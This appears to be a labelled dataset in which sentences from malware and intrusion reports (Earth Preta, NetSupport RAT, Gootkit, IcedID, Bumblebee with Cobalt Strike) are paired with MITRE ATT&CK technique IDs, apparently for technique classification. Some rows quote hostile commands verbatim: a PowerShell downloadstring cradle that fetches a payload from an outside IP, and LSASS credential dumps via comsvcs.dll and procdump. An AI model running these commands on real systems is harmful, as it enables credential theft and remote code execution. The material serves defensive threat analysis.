"Based on some internal strings and the APIs used by Earth Preta, the functionalities of this backdoor can be inferred as follows: Send portmap Build connection Read file Delete file Keystrokes and windows monitoring Backdoor.","T1106, T1056.001, T1070.004"
"However, this backdoor has an anti-debugging technique, which will check if the running processes have the strings dbg.exe or olly. Figure 27.",T1057
"There are two waysto determine the method of installation for TROCLIENT, detailed here: It installs itself by creating aservice called InstallSvc which will trigger “C:\programdata\netsky\netsky.exe online”.","T1547.001, T1569.002, T1543.003"
It sets up a run key for the command C:\programdata\netsky\netsky.exe online for persistence.,T1547.001
"online: It will read the next stage payloads, free.plg and main.plg, and inject them into dllhost.exe. passuac:",T1055
"If it does not, UAC bypass is executed via the CMSTPLUA COM interface.",T1548.002
"If avp.exe exists, UAC bypass is executed via token manipulation.",T1548.002
"The capabilities of three different arguments This backdoor provides the following capabilities: Read file Delete file Monitor keystrokes and windows There are several similarities and differences between COOLCLIENT and TROCLIENT, as Table 3 shows.","T1056.001, T1070.004"
Argument/Behaviors COOLCLIENT TROCLIENT install Creates a service named InstallSvc ✓ ✓ Executes itself with passuac ✓ ✓ Sets Run Key with “work/online” ✓ ✓ passuac AppInfo RPC ✓ CMSTPLUA COM ✓ ✓ Token manipulation ✓ work/online Send portmap ✓ Connect to C&C ✓ ✓ File operations ✓ ✓ Keylogging ✓ ✓ Table 3.,"T1547.001, T1543.003, T1056.001"
"It seems that the threat actors are continuously updating this tool to provide more flexibility and lower the possibility of detection, including adding more command-line arguments and obfuscation mechanisms.","T1027, T1059.003"
"Starting from the offset 0x100, the logging strings are encrypted with a single byte in XOR operations as shown Figure 33.",T1027
"The NUPAKAGE malware first generates a key blob randomly, with the key being encrypted in a custom algorithm.",T1573.001
"Self-defined format description in the file with the .z extension generated by NUPAKAGE It’s also worth mentioning that in the more recent versions of NUPAKAGE, an increasing number of obfuscations are being adopted to thwart static analysis.",T1027
Win32.ZPAKAGE ZPAKAGE is another example of custom malware used for packing files; it also works similarly to NUPAKAGE.,T1027
"An example of a ZPAKAGE password ZPAKAGE also supports command-line arguments, but it possesses less functions than NUPAKAGE.",T1059.003
"Regardless of whether the file content is compressed or not, it will be encrypted in XOR operations with a specific string, qwerasdf.",T1573.001
Screenshot of the Google Drive link The new arrival vector flow is similar to the one we introduced in the arrival vector section: Victims will receive and interact with a decoy document containing a Google Drive link and a corresponding password instead of an archive download link embedded in the email.,"T1566.001, T1204.002"
Our investigation started with the TONESHELL C&C server 38[.]54[.]33[.]228 that had the remote desktop service enabled.,T1021.001
"At first glance, Cobalt Strike was used in a manner similar to this campaign, including the use of DLL sideloading, the use of a Google Drive link for delivery, and the creation of a schedule task.","T1574.002, T1053.005"
"Once the malicious DLL is sideloaded, it will drop the legitimate EXE file and the malicious DLL file, which are embedded in the resource section of the DLL file.",T1574.002
"The 1226 repository Upon unarchiving the compressed file, we found two files with the fake extension “.doc” containing one-byte XOR encrypted sections.",T1027
"Exe, found in the Documents.rar archive, is a novel malware that communicates over the MQTT protocol.",T1071.001
"This backdoor is unique because it communicates to its C&C servers over the MQTT protocol, which is commonly used in internet-of-things (IoT) devices.",T1071.001
Basic Terminology for Reverse Engineers to Know An executable file can conceal its true code through either encryption or compression.,T1027
"When the file is executed, some initial code usually called a stub, decrypts or decompresses the real code so it can be executed.",T1140
"While packers can be used for legitimate purposes, malware developers utilize packers to make the malicious payload smaller and avoid detection based on static malware analysis techniques.",T1027
Examples: UPX is an open-source packing algorithm.,T1027
MPRESS is a free packer.,T1027
Andromeda is a custom packer that makes reverse-engineering more difficult.,T1027
"On the other hand, there are loaders that serve as the first stage of the attack, the payload of the malware can be part of the loader’s file or it can be downloaded from a remote location (by the loader, also known as a Downloader).","T1027, T1105"
"The packers compress (and if it has the functionality of a crypter also encrypts) the original executable, which is saved in one of the sections of the final packed file.",T1027
"The entry point of the original file is relocated, and so is the Import Address Table (IAT).",T1027
The stub is a small part of code that implements the decompression (and decryption) of the originally packed file.,T1140
"Packers may change the final payload’s section names, as seen in the screenshot below.",T1027
Packed samples usually have very few imports as they don’t rely on external libraries like other programs.,T1027
"When a file has a low number of imports, it strongly indicates that it contains another component that is dropped/loaded.",T1027
"API Calls Essentially, all packers need to perform the following operations: allocate memory, change permissions, read the encrypted/packed chunk of code, decrypt it, load it to the allocated memory space and execute it.",T1027
"To make all of these actions, the program must use system calls because these actions require interaction with the kernel.","T1027, T1106"
The relevant system calls are VirtualAlloc used for allocating memory in the current process.,"T1027, T1106"
"Knowing the size can help identify when a program allocates big memory space, possibly for the unpacked payload.","T1027, T1106"
VirtualProtect changes the permissions of the given virtual address.,"T1027, T1106"
When malware wants to grant write or execute permissions flNewProtect argument will be set to PAGE_EXECUTE_READWRITE (0x40) or PAGE_EXECUTE_READ (0x20).,"T1027, T1106"
RtlDecompressBuffer decompresses the provided buffer.,"T1027, T1106"
CreateProcessInternalW creates a new process.,"T1027, T1106"
"In the context of malware execution, it can create a new threat with the malicious unpacked payload.",T1027
"However, malware authors usually try to hide these system calls.",T1027
"For instance, we will not see them in the imported function list, and they not even be part of the strings in the sample.",T1027
"In this case, the function and the corresponding library are dynamically loaded at runtime – also known as explicit linking.",T1027
"Our follow-up analysis discovered that firmware in Gigabyte systems is dropping and executing a Windows native executable during the system startup process, and this executable then downloads and executes additional payloads insecurely.",T1105
Key Findings There are two important aspects of our findings: Eclypsium automated heuristics detected firmware on Gigabyte systems that drops an executable Windows binary that is executed during the Windows startup process.,T1105
This executable binary insecurely downloads and executes additional payloads from the Internet.,T1105
Firmware dropping OS executable An initial analysis of the affected UEFI firmware identified the following file: 8ccbee6f7858ac6b92ce23594c9e2563ebcef59414b5ac13ebebde0c715971b2.bin,T1027
This is a Windows Native Binary executable embedded inside of UEFI firmware binary in a UEFI firmware volume with the following GUID: AEB1671D-019C-4B3B-BA-00-35-A2-E6-28-04-36.,T1027
"This Windows executable is embedded into UEFI firmware and written to disk by firmware as part of the system boot process, a technique commonly used by UEFI implants and backdoors.",T1027
"During the Driver Execution Environment (DXE) phase of the UEFI firmware boot process, the “WpbtDxe.efi” firmware module uses the above GUID to load the embedded Windows executable file into memory, installing it into a WPBT ACPI table which will later be loaded and executed by the Windows Session Manager Subsystem (smss.exe) upon Windows startup.",T1027
"Although this setting appears to be disabled by default, it was enabled on the system we examined.",T1106
This executable uses the Windows Native API to write the contents of an embedded executable to the file system at the following location:,"T1027, T1106"
%SystemRoot%\system32\GigabyteUpdateService.exe It then sets registry entries to run this executable as a Windows Service.,"T1569.002, T1112"
Stage 2: Downloading and running further executables,T1105
"It downloads and runs an executable payload from one of the following locations, depending on how it’s been configured: http://mb.download.gigabyte.com/FileList/Swhttp/LiveUpdate4 https://mb.download.gigabyte.com/FileList/Swhttp/LiveUpdate4 https://software-nas/Swhttp/LiveUpdate4 Plain HTTP (the first bullet above) should never be used for updating privileged code as it is easily compromised via Machine-in-the-middle (MITM) attacks.",T1105
"However, we noticed that even when using the HTTPS-enabled options, remote server certificate validation is not implemented correctly.",T1071.001
"Often, the above implants made their native Windows executables look like legitimate update tools.",T1036.005
"In the case of MosaicRegressor, the Windows payload was named “IntelUpdater.exe” MITM attacks on firmware and software update features – Additionally, the insecure nature of the update process opens the door to MITM techniques via a compromised router, compromised device on the same network segment, DNS poisoning, or other network manipulation.",T1036.005
"Background NetSupport RAT is based on NetSupport Manager, a legitimate tool which is frequently used by bad actors for malicious purposes in ways similar to TeamViewer.",T1219
"NetSupport Manager, used maliciously or otherwise, provides full and complete control over the target device.",T1219
"In addition, the software allows at least the following: Real-time screen monitoring, optimized for monitoring multiple devices Taking control or redirect user screens Capturing screenshots, audio, video Malicious versions are constantly being sold or rented out via underground crime marketplaces.",T1113
"NetSupport Manager RAT offered for rental As NetSupport Manager is a legitimate tool that has a long history of development, it is highly attractive to attackers as it can be relied on to work ‘out of the box’.",T1219
"Sample 4233ff7941da62b86fc2c2d92be0572c9ab534c8 has been observed in multiple ISO files masquerading as legitimate software, including: CodeTwo Exchange Manager PCFresh 2022 SDK Tools Google Chrome Google Crash Handler Steelray Project Setup BrowserRenew.iso CLFsecurity.",T1036.005
ISO Cloudflare_security_setup.iso The RAT installation is disguised to look similar to a Google Chrome installation.,T1036.005
NetSupport RAT installer disguised as Google Chrome setup.,"T1027, T1036.005"
The sample is obfuscated via the Babadeda crypter.,T1027
"When executed, a base64 encoded string is used to specify various parameters including sessionID and other critical values to the NetSupport connection.",T1027
"Base64 encoded RAT execution command The command decodes to look similar to the following: NetSupport RAT decoded command Persistence for the RAT is achieved via registry entry, and a shortcut to the installed RAT executable is written to the Startup folder.","T1027, T1547.001, T1140"
"In addition, the sample generates a scheduled task with multiple triggers.",T1053.005
NetSupport RAT Persistence via Scheduled Task Install directory of NetSupport RAT The RAT performs a number of discovery operations to understand its host environment.,T1053.005
Network adapter details are pulled via GetAdaptersAddresses.,T1016
Additional data is gleaned via WMI queries such as: SELECT *,"T1047, T1082"
FROM Win32_ComputerSystem SELECT *,T1082
"The malware deploys some anti-analysis measures such as attempting to detect the presence of a debugger via IsDebuggerPresent, and all running processes are enumerated and logged via EnumProcesses (32-bit processes).",T1057
NetSupport RAT has the ability to drop and execute additional components.,T1105
These files are all self-deleted after launch or full installation of the attacker configuration.,T1070.004
"NetSupport RAT, once installed, is very robust and powerful, and threat actors are able to masquerade the dropper or installer in any way they see fit.",T1036.005
"In addition, threat actors using this tool are very quick to update their lures and find ways to entice their victims into installing the malicious remote control software.",T1204.002
"RapperBot: “intelligent brute forcing” RapperBot, based on Mirai (but with a different C2 command protocol), is a worm infecting IoT devices with the ultimate goal to launch DDoS attacks against non-HTTP targets.",T1110
"What sets RapperBot apart from other worms is its “intelligent” way of brute forcing: it checks the prompt and, based on the prompt, it selects the appropriate credentials.",T1110
This method speeds up the brute forcing process significantly because it doesn’t have to go over a huge list of credentials.,T1110
RapperBot then determines the processor architecture and infects the device.,T1082
"The downloading of the actual malware is done via a variety of possible commands (for example, wget, curl, tftp and ftpget).",T1570
"If for some reason these methods don’t work, then a malware downloader is uploaded to the device via the shell “echo” commands.","T1105, T1059.003"
Is able to do a “stealthy” infection.,T1082
"Is able to steal/gather information on CPU type, screen resolution, supported wallets, and so on.",T1082
"In case all checks are passed, the malware: Reconfigures Windows Defender to exclude the user profile path and the entire system drive from scanning.",T1562.001
Creates empty files and subdirectories in %ProgramData%\HostData to make the directory look benign.,T1105
Downloads the miner and watcher.,T1105
Gootkit is a very capable banking Trojan that has been around since 2014 and possesses a number of functionalities such as keystroke or video recording designed to steal financially-related information.,T1056.001
"In this latest campaign, threat actors are relying on compromised websites to socially engineer users by using a decoy forum template instructing them to download a malicious file.",T1204.002
The infection process starts once the victim executes a malicious script inside the zip archive they just downloaded.,"T1027, T1204.002"
"The following diagram shows a high level overview: Figure 5: Infection flow Stage 1 – The first JavaScript The first JavaScript is the module that has to be manually executed by the victim, and it has been obfuscated in order to hide its real intentions.","T1027, T1204.002"
The obfuscation consists of three layers where one decodes content for the next.,T1140
The first stage (a version with cleaned formatting available here) decodes the next element: Figure 6: First stage script The decoded output is a comma-separated array of JavaScript blocks: Figure 7: Decoded comma-separated array of scripts There are four elements in the array that are referenced by their indexes.,T1140
Block 1 is responsible for reading/writing registry keys under “HKEY_CURRENT_USER\SOFTWARE\<script-specific name>”.,T1112
It also deobfuscates and runs another block of code: Figure 8: Third JavaScript layer This fragment of code is responsible for connecting to the C2.,T1140
"The differentiation between the variants starts in the next part, which is another JavaScript fetched from the C2 server.",T1105
"Figure 9: GET request with C2 server After conversion to ASCII, the next JavaScript is revealed, and the code is executed.",T1071.001
"This JavaScript comes with an embedded PE payload which may be either a loader for Gootkit, or for the REvil ransomware.",T1027
There are also some differences in the algorithm used to deobfuscate it.,T1140
"Example for the Gootkit variant (commented, full) Figure 10: The downloaded JavaScript The downloaded code chunk is responsible for installing the persistent elements.",T1105
"It also runs a Powershell script that reads the storage, decodes it and runs it further.",T1140
"In one of them, the PE is stored as a Base64 encoded string, and in the other as a hexadecimal string, obfuscated by having certain numbers substituted by a pattern.",T1027
"The payload is usually stored as a list of registry keys, yet we also observed a variant in which similar content was written into a TXT file.",T1027
Example of the payload stored in a file: Figure 11: Payload as a file on disk The content of the file is an obfuscated Powershell script that runs another Base64 obfuscated layer that finally decodes the .NET payload.,T1027
"Example of the Powershell script that runs to deobfuscate the file: ""C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"" -ExecutionPolicy",T1140
The example below shows the variant in which a PE file was encoded as an obfuscated hexadecimal string.,T1027
"Execution of the second stage JavaScript leads to the payload being written to the registry, as a list of keys.",T1112
"Figure 12: Fragment of the payload stored in the registry, encoded as a hexadecimal string obfuscated with a pattern After writing the keys, the JavaScript deploys a PowerShell command that is responsible for decoding and running the stored content.",T1140
Figure 13: The JS component deploys PowerShell with a Base64 encoded script Decoded content of the script: Figure 14: Decoded content It reads the content from the registry keys and deobfuscates it by substituting patterns.,"T1027, T1140"
"In the given example, the pattern “!@#” in the hexadecimal string was substituted by “1000”, then the PE was decoded and loaded with the help of .NET",T1140
The Setup function called by the PowerShell script is responsible for decoding and running the next PE: Figure 15: Hardcoded string (PE) Figure 16:,T1140
Deploying the payload The loader runs to the next stage with the help of Process Hollowing – one of the classic methods of PE injection.,T1055
"Figure 17: REvil ransom note Example 2 – Loading Gootkit In an other common variant, the payload is saved as Base64.",T1027
"Convert]::FromBase64String(""[content]"")); Invoke-Expression $Command;Start-Sleep -s 22222; Figure 18: Registry key storing payload After decoding the base64-encoded content, we get another PowerShell script: Figure 19:",T1140
More PowerShell It comes with yet another Base64-encoded piece that is further decompressed and loaded with the help of Reflection Assembly.,T1140
"This function loads another PE, that is embedded inside as a base64 encoded buffer: Figure 20: Another buffer Figure 21: Deploying the payload This time the loader uses another method of PE injection, manual loading into the parent process.","T1027, T1055"
"In its resources we can find another PE (327916a876fa7541f8a1aad3c2270c2aec913bc8898273d545dc37a85ef7307f ), obfuscated by XOR with a single byte.",T1027
"Separate clusters of IcedID activity (Proofpoint) New IcedID campaigns Starting in November 2022, the “Lite” variant of the IcedID loader was delivered as a second-stage payload on systems infected by the newly-returned Emotet malware.",T1566.001
"The “Forked” version of the malware loader first appeared in February 2023, distributed directly through thousands of personalized invoice-themed phishing emails.",T1566.001
"These messages used Microsoft OneNote attachments (.one) to execute a malicious HTA file that, in turn, runs a PowerShell command which fetches IcedID from a remote resource.","T1566.001, T1105"
"At the same time, the victim is served a decoy PDF.",T1566.001
Malicious OneNote attachment used in recent campaign (Proofpoint),T1566.001
"The new variants The “Forked” IcedID loader is quite similar to the “Standard” version in terms of its role, sending basic host info to the C2 and then fetching the IcedID bot.",T1041
"However, “Forked” uses a different file type (COM Server) and features additional domain and string-decryption code, making the payload 12KB larger than the “Standard” version.",T1140
"The intrusion began with a password protected zipped ISO file that we assess with medium to high confidence due to other reports, likely arrived via an email which included a link to download said zip file.",T1204.002
"The execution phase started with that password protected zip, which after extracting would show the user an ISO file that after the user double clicks would mount like a CD or external media device on Windows and present the user with a single file named documents in the directory.",T1204.002
"When the user double clicks or opens the lnk file, they inadvertently starts a hidden file in the directory, a DLL (namr.dll) containing the Bumblebee malware loader.","T1564.001, T1204.002"
"At first, things remained fairly quiet, just C2 communications; until around 3 hours later, Bumblebee dropped a Cobalt Strike beacon named wab.exe on the beachhead host.",T1105
"This Cobalt Strike beacon was subsequently executed and then proceeded to inject into various other processes on the host (explorer.exe, rundll32.exe).",T1055
"From these injected processes, the threat actors began discovery tasks using Windows utilities like ping and tasklist.","T1057, T1055, T1059.003"
"Four hours after initial access, the threat actor started their first lateral movement using RDP to pivot to a server using the local Administrator account.","T1021.001, T1078"
"The threat actor then deployed Anydesk, which was the only observed persistence mechanism used during the intrusion.",T1219
"Then, the next day, they accessed the server via RDP and deployed a bespoke tool, VulnRecon, designed to identify local privilege escalation paths on a Windows host.",T1021.001
"Next, the threat actor transferred Sysinternals tool Procdump over SMB, to the ProgramData folders on multiple hosts in the environment.",T1570
"They then used remote services to execute Procdump, which was used to dump lsass.",T1003.001
"After that activity, the threat actors then disappeared until the 7th day, at which time they accessed the server via Anydesk.",T1219
The threat actors used PowerShell to download and execute a new Cobalt Strike PowerShell beacon in memory on the beachhead host.,T1105
"After injecting into various processes on the host, the threat actors executed the PowerShell script Invoke-Kerberoast.",T1055
"Next, they used yet another technique to dump LSASS on the beachhead host, this time using a built in Windows tool comsvcs.dll.",T1003.001
"AdFind was run for a 3rd time in the network, and then two batch scripts were dropped and run.",T1059.003
"These batch scripts’ purposes were to identify all online servers and workstations in the environment, often a precursor to ransomware deployment by creating the target list for that deployment.",T1059.003
"Next, the threat actors used a service account to execute a Cobalt Strike beacon remotely on a Domain Controller.",T1569.002
Timeline Analysis and reporting completed by @0xtornado and @MetallicHack Initial Access,T1566.001
"The threat actors managed to get access to the beachhead host after the successful execution of a lnk file within an ISO, which are usually distributed through email campaigns.",T1566.001
"The initial payload named BC_invoice_Report_CORP_46.iso, is an ISO image that once mounted, lures the user to open a document.lnk file which will execute the malicious DLL loader using the following command line:","T1218.011, T1059.003, T1204.002"
"C:\Windows\System32\cmd.exe /c start rundll32 namr.dll,IternalJob Running Eric Zimmerman’s tool LECmd revealed additional details related to the threat actors.","T1059.003, T1218.011"
"The metadata included TA machine’s hostname, MAC address, and the LNK document creation date: Execution Execution of multiple payloads The successful execution of BumbleBee payload (namr.dll) resulted in the dropping and the execution of several payloads using multiple techniques.","T1105, T1016, T1082"
"The graph below shows all the payloads dropped by BumbleBee, the way they were executed, and the different processes they injected into: Sysmon File Created event showing wab.exe created by rundll32.exe Sysmon Event Code 1 showing wab.exe executed by WMI Execution of Cobalt Strike The following PowerShell one-liner was executed from wab.exe during day 11, which downloaded obfuscated PowerShell and executed it in memory: C:\Windows\system32\cmd.exe /C","T1047, T1218.011, T1105, T1027, T1059.003, T1055"
powershell.exe -nop,T1059.003
"-w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://104.243.33.50:80/a'))"" Since the download took place over an unencrypted HTTP channel, the network traffic was plainly visible.","T1059.003, T1071.001"
"This payload can be deobfuscated using the following CyberChef recipe: Regular_expression('User defined','[a-zA-Z0-9+/=]{30,}',true,true,false,false,false,false,'List matches') From_Base64('A-Za-z0-9+/=',true) Gunzip() Label('Decode_Shellcode') Regular_expression('User defined','[a-zA-Z0-9+/=]{30,}',true,true,false,false,false,false,'List matches') Conditional_Jump('',false,'',10) From_Base64('A-Za-z0-9+/=',true) XOR({'option':'Decimal','string':'35'},'Standard',false) Once deobfuscated, we can spot the MZRE header, which is part of the default configuration of Cobalt Strike: One of the easiest ways to extract valuable information from this Shellcode is using Didier Stevens 1768.py tool: The command and control server was hosted on (108.62.12[.]174/dofixifa[.]co).",T1140
Persistence AnyDesk and its installation as a service was used in order to persist and create a backdoor to the network.,"T1543.003, T1219"
Privilege Escalation GetSystem Threat actors made a mistake by launching the getsystem command in the wrong console (shell console rather than the beacon console).,T1059.003
"cbdhsvc , a process where Cobalt Strike was injected into: C:\Windows\system32\cmd.exe /C","T1055, T1059.003"
getsystem,T1059.003
"A detailed write-up of this feature is documented in the official Cobalt Strike blog and was also detailed in our Cobalt Strike, a Defender’s Guide blog post. Valid Accounts Threat actors obtained and abused credentials of privilege domain accounts as a means of gaining privilege escalation on the domain.",T1078
"A service account, with Domain Administration permissions, was used to create a remote service on a Domain Controller to move laterally.",T1078
Defense Evasion Process Injection The process injection technique was used multiple times to inject into different processes.,T1055
Almost every post-exploitation job was launched from an injected process.,T1055
"Right after its execution, the wab.exe process created two remote threads in order to inject code into explorer.exe and rundll32.exe: Threat actors also created a remote thread in svchost.exe: Multiple processes were then spawned by : C:\Windows\system32\svchost.exe -k ClipboardSvcGroup -p",T1055
A yara scan of process memory using the Malpedia Cobalt Strike rule revealed the various injections across hosts as well.,T1055
WpnUserService 20400 rundll32.exe C:\Windows\System32\rundll32.exe Indicator Removal on Host: File Deletion,T1027
"We observed the threat actors deleting their tools (Procdump, Network scanning scripts, etc.) from hosts.",T1027
The table below shows an example of ProcDump deletion from the ProgramData folder of all targeted workstations after dumping their LSASS process: Credential Access LSASS Dump MiniDump Threat actors dumped the LSASS process from the beachhead using the comsvcs.dll MiniDump technique via the C:\Windows\system32\svchost.exe -k ClipboardSvcGroup -p,"T1027, T1003.001"
-s cbdhsvc beacon: cmd.exe /C,"T1059.003, T1218.011"
"rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 968 C:\ProgramData\REDACTED\lsass.dmp full ProcDump Threat actors also dropped procdump.exe and procdump64.exe on multiple workstations remotely, dumped LSASS, and deleted them from the ProgramData folder:","T1027, T1003.001, T1218.011"
"The ProcDump utility was executed on those workstations using the following command line: C:\programdata\procdump64.exe -accepteula -ma lsass.exe C:\ProgramData\lsass.dmp Kerberoasting Invoke-Kerberoast command was executed from the beachhead through svchost.exe, a process where the threat actors injected: Here is an extract of PowerShell EventID","T1003.001, T1055"
"Around 3 hours later, the service account logged into one of the Domain Controllers from the beachhead.",T1078
We assess with high confidence that the service account password was weak and cracked offline by threat actors.,T1110
"Discovery Reconnaissance System Information & Software Discovery The following commands were launched by wab.exe beacon: whoami ipconfig /all tasklist systeminfo wmic product get name,version wmic /node:<REDACTED> process list brief net view \\<REDACTED>\Files$ /all dir \\<REDACTED>\C$\ Using the same beacon, wab.exe, tasklist was also used in order to enumerate processes on multiple hosts remotely: tasklist /v /s","T1047, T1057, T1082, T1033, T1016"
"Opsec mistake Threat actors failed on a part of their tasks, by executing the command in the wrong console: C:\Windows\System32\rundll32.exe ➝ C :\Windows\system32\cmd.exe /C","T1033, T1059.003, T1218.011"
shell whoami /all,"T1033, T1059.003"
Network scanning Threat actors used two scripts named s.bat (for servers) and w.bat (for workstations) to ping the hosts and store the results in two log files: s.bat script: @echo off for /f,T1059.003
%%j >> serv.log w.bat script: @echo off for /f,T1059.003
"| Tee-Object ShareFinder.txt Because rundll32.exe executed PowerShell, we can see that rundll32.exe created the ShareFinder.txt output file in C:\ProgramData\. Seatbelt The tool SeatBelt was used by the threat actors on a server in order to discover potential security misconfigurations.",T1218.011
"Option/Command Details (from the code) ‘v’ or “Vulnerability” “Search for available vulnerabilities for using LPE tools””Scans the operating system for vulnerabilities and displays a list of tools for a LPE” ‘m’ or “MicrosoftUpdates” “List of all installed microsoft updates””Displays a list installed Microsoft updates” ‘h’ or “HotFixes” “List of installed hot fixes””Displays a list of installed hot fixes” ‘s’ or “SupportedCve” “List of implemented tools for LPE “”Displays list of implemented CVE for LPE” ‘i’ or “SystemInfo” “Display information about current Windows version “ Below is the list of all of the currently supported (or implemented) CVE enumeration via installed KBs mapping: Threat actors executed this tool on patient 0 with low-level privileges multiple times, and again on a server with Administrator privileges.","T1078, T1082"
"Below are all the command lines run by the adversaries: Lateral Movement Lateral Tool Transfer Using the Cobalt Strike beacon, the threat actors transferred AnyDesk (1).exe file from the beachhead to a server: The threat actors also transferred ProcDump from the beachhead to multiple workstations: Remote Services Remote Desktop Protocol Threat actors used explorer.exe, where they were previously injected into, to initiate a proxied RDP connection to a server: Threat actors performed the first lateral movement from the beachhead to the server using RDP with an Administrator account: This first lateral movement was performed in order to drop and install AnyDesk.","T1570, T1055, T1021.001, T1078"
"SMB/Windows Admin Shares Remote Service over RPC Multiple RPC connections were initiated from the rundll32.exe process where wab.exe previously injected into: These RPC connections targeted multiple hosts, including workstations, servers, and DCs.","T1055, T1218.011"
"As we can see with one server, which was targeted, the win32 function CreateServiceA was used by the malware in order to create a remote service over RPC on the server.","T1106, T1543.003"
"On each usage of this feature, a remote service was created with random alphanumeric characters, service name and service file name, e.g. “<7-alphanumeric-characters>.exe”.",T1543.003
Below is an example of the service edc603a that was created on a Domain Controller:,"T1543.003, T1078"
The account used to perform this lateral movement was one of the kerberoasted service accounts.,"T1218.011, T1078"
The random (PsExec) service runs a rundll32.exe process without any arguments.,T1218.011
"We observed this beacon performing various techniques (Process injections in svchost process via CreateRemoteThread, Default named pipes, etc.) Command and Control The graph below shows all communications to malicious IP addresses made by the dropped payloads or processes which threat actors injected into: BumbleBee 142.91.3[.]109 45.140.146[.]30 All the active Bumblebee command and control shared a common server configuration in regards to TLS setup.",T1055
"Pty Ltd Subject Org: Internet Widgits Pty Ltd Public Algorithm: rsaEncryption Cobalt Strike Cobalt Strike (CS) was extensively used during this intrusion, the threat actors used CS as the main Command and Control tool, dropped several payloads, and injected into multiple processes on different hosts.","T1105, T1055"
"Named pipes were created in order to establish communication between CS processes: In this particular case, threat actors used default post-exploitation jobs, which have a pattern of postex_[0-9a-f]{4}.",T1090
Below is the full list of all default named pipes spotted during this intrusion: \postex_0dde \postex_3e9b \postex_4008 \postex_4429 \postex_55f8 \postex_8248 \postex_8c73 \postex_972d \postex_fc2e Named piped are commonly used by Cobalt Strike perform various techniques.,T1090
"AnyDesk As mentioned before in the lateral tool transfer section, threat actors remotely dropped AnyDesk binary on a server from the beachhead: A new service was created (Event ID 7045) upon the execution of AnyDesk installer:","T1570, T1543.003, T1219"
"AnyDesk logs, %ProgramData%\AnyDesk\ad_svc.trace",T1219
and,T1219
"%AppData%\AnyDesk\ad.trace, show that it was used during Day 1 and Day 7 of this intrusion, using the Administrator account each time.","T1078, T1219"
"This threat actor employs tactics such as LOLBaS (Living Off the Land Binaries and Scripts), along with CMD-based scripts to carry out its malicious activities.",T1059.003
"In this case, the threat actor behind the campaign used CMD-based scripts, AutoIt scripts, and LOLBaS. LOLBaS and CMD-based scripts help threat actors avoid detection by traditional security measures.",T1059.003
"By utilizing these techniques, they can gain unauthorized access to victims' systems, extract sensitive information, and ultimately compromise online banking accounts and payment systems.",T1005
"Their selection of countries is likely influenced by the prevalence of online banking usage in these regions, making them lucrative targets for financial fraud.",T1059.003
The first .CMD file set seen to use AutoIt in its execution was discovered at the end of 2021.,T1059.003
Each email has an HTML attachment.,T1566.001
"Figure 2 – Phishing email contents The email text employs scare tactics, such as evidence of a traffic violation, prompting the user to open the HTML attachment which contains some junk code and data in HEX format.","T1027, T1566.001, T1204.002"
"Figure 3 – ""multa_de_transito_502323.html"" attachment content The data blob in HEX decodes to a slightly obfuscated URL address which upon cleanup translates to: hxxps[:]//multa-ansr-pt[.]fun/?hcBViJAi9EZSc3YQwxpEwfmD7xdG0IF34EWGHj6Q. This URL resolves to: 162.0.232[.]115 IP address.","T1027, T1140"
"During the extensive analysis of the “.HTML” files, BlackBerry identified a large list of HEX-encoded URLs, some of which are listed here: hxxps[:]//factura61[.]click/2/?j5szsmo0bk8tOSQSMS4mmp1XtQrmbNYoCB2GBem8 hxxps[:]//factura61[.]click/2/?vzlv9CZ1gnLrNIaWBJBhJNWRCt7IVXDDwVzOQhSs hxxps[:]//sunat-pe[.]fun/?D80gaUJDUfuLG6lodTSEi7qoqciBWk5xE5w81pJO hxxps[:]//factura61[.]click/2/?CTtBmkRN8KPXVTgUn1ArCPGb5WXTXTaT7etdD7TC hxxps[:]//factura61[.]click/2/?yqJl8r7henupax3WsUvITb0PuSw5sn7HyZWGMvDv hxxps[:]//factura61[.]click/2/?GxkVBvEBTFfSDqaFr8Yjw9kyKH01xRseHoF0DNQc hxxps[:]//multa-ansr-pt[.]fun/?UFqQBhFaXulvEfeTbI38FFDKRth1r2DWKOFqUI0Y hxxps[:]//multa-ansr-pt[.]fun/?l4mm0DEhDbJPYd5qAQmwst09TDTjjvYjiG7ByCvx Opening the attached “multa_de_transito_502323.html” file triggers the embedded JavaScript and reaches out to hxxps[:]//multa-ansr-pt[.]fun/?hcBViJAi9EZSc3YQwxpEwfmD7xdG0IF34EWGHj6Q to pull down the next stage which is a compressed archive (RAR) file.",T1027
"Weaponization The contents of the previously mentioned archive include a single “.CMD” file typically titled from one of the following filenames, (but there are other names): doc-Impuestos.cmd doc-Impostos.cmd Impuestos-Documento.cmd doc_Factura.cmd Documento_Impostos.cmd The “.CMD” file is large, ranging between 1.34 - 1.37MBs, and consists of two base64 encoded data blobs and code instructions for its execution.",T1027
"Figure 4 – Code instructions for both base64 data block execution The first base64 data blob is compiled AutoIt script and the second is AutoIt interpreter (a benign file), used to run the first file.",T1027
The purpose of the AutoIt script is to enumerate the host and download a “.VBS” file which then gets executed via the “SHELLEXECUTE”.,"T1105, T1059.003"
"Next, it invokes the “_OUTRECOVERY()” function to steal Outlook data such as server, user, and password from POP3, SMPT, and IMAP registry keys.",T1012
It proceeds by downloading the “sqlite3.dll” file from “hxxps[:]//www[.]autoitscript[.]com/autoit3/pkgmgr/sqlite/” which will be required later during the Chrome password theft.,"T1041, T1105"
All data is then sent back to the attacker's C2 via the HTTP POST method.,"T1041, T1071.001"
"The C2 is constructed with the victim's enumerated data, where the values are: v1 – OS language (e.g., 1033 – English US) v2 – keyboard layout (e.g., 1033 – English US) v3 – operating system version (Windows 7,8,10,11 or unknown) v4 – is target an admin or user v5 – OS architecture (x86 or x64)","T1005, T1082"
"These have included low-effort capabilities such as spearphishing emails and third-party message services directed at both corporate and personal accounts, as well as exploiting vulnerable web-facing devices and remote connection capabilities.",T1190
"Technical DetailsATT&CK Profile CISA created the following MITRE ATT&CK profile to provide a non-exhaustive list of tactics, techniques, and procedures (TTPs) employed by APT actors to break through think tanks’ defenses, conduct reconnaissance in their environments, exfiltrate proprietary or confidential information, and execute effects on targets.",T1005
This loader then executes two more self-extracting archive executables that are responsible for decrypting a shellcode to load the Amadey Trojan and two instances of the RedLine Stealer malware onto the system.,T1140
Figure 4 shows the code snippet of this RedLine component that will do the following: Escalate its privilege as administrator or trustedinstaller Try to disable Windows Defender service “WinDefend” Try to disable Tamper Protection settings of Windows Defender.,T1562.001
"Try to Disable AntiSpyware, Real Time Protection and notification of Windows Defender.",T1562.001
